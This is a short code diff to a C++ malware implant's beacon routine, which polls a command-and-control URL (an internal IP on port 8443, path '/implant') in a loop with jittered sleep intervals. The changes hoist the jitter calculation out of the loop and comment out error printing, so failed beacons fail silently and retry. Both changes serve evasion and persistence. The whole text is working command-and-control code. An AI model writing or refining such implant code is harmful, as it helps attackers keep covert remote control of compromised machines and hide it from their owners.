@@ -14,6 +14,11 @@ std::string url = "http://192.168.0.54:8443/implant";
 const int baseWaitTime = 500; //ms
 const double maxJitter = 0.3 * baseWaitTime; // 30% of base wait time
 // Calculate the final wait time with jitter
+std::random_device rd;
+std::mt19937 gen(rd());
+std::uniform_real_distribution<> distrib(-maxJitter, maxJitter);
+double jitter = distrib(gen);
+int waitTimeWithJitter = baseWaitTime + static_cast<int>(jitter);
 
 bool isRunning = true;
 
@@ -41,21 +46,13 @@ std::string beaconLogic() {
         try {
             std::string response = xhttp::http_get(url);
 
-            // Handle the commands and things through here. To much tangled code.
-
-            std::random_device rd;
-            std::mt19937 gen(rd());
-            std::uniform_real_distribution<> distrib(-maxJitter, maxJitter);
-            double jitter = distrib(gen);
-            int waitTimeWithJitter = baseWaitTime + static_cast<int>(jitter);
-
             // Sleep for the calculated time
             std::this_thread::sleep_for(std::chrono::milliseconds(waitTimeWithJitter));
 
         }
         catch (const std::exception& e) {
-            printf("\nBeaconing error: %s\n", e.what());
-
+            //printf("\nBeaconing error: %s\n", e.what());
+            std::this_thread::sleep_for(std::chrono::milliseconds(waitTimeWithJitter));
         }
     }
     // cleanup
